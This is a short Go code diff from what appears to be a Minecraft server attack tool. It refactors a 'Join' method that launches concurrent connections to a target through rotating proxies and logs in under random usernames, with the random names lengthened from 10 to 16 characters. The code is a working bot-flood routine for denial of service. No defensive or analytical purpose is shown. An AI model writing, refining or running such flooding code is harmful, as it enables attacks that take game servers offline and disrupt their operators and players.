@@ -23,16 +23,16 @@ func (join Join) Start(info *core.AttackInfo, dialPool *proxy.DialPool) {
 		go connect(info, dialPool)
 	}
 }
+
 func connect(info *core.AttackInfo, dialPool *proxy.DialPool) {
-	{
-		conn, err := mc.DialMC(info.Ip, info.Port, dialPool.GetNext())
-		if err != nil {
-			return
-		}
-		mcutils.WriteHandshake(conn, info.Ip, info.Port, info.Protocol, mcutils.Login)
-		mcutils.WriteLoginPacket(conn, utils.RandomName(10), false, nil)
+	conn, err := mc.DialMC(info.Ip, info.Port, dialPool.GetNext())
+	if err != nil {
+		return
 	}
+	mcutils.WriteHandshake(conn, info.Ip, info.Port, info.Protocol, mcutils.Login)
+	mcutils.WriteLoginPacket(conn, utils.RandomName(16), false, nil)
 }
+
 func (join Join) Stop() {
 	// implementation for stopping the join method
 }
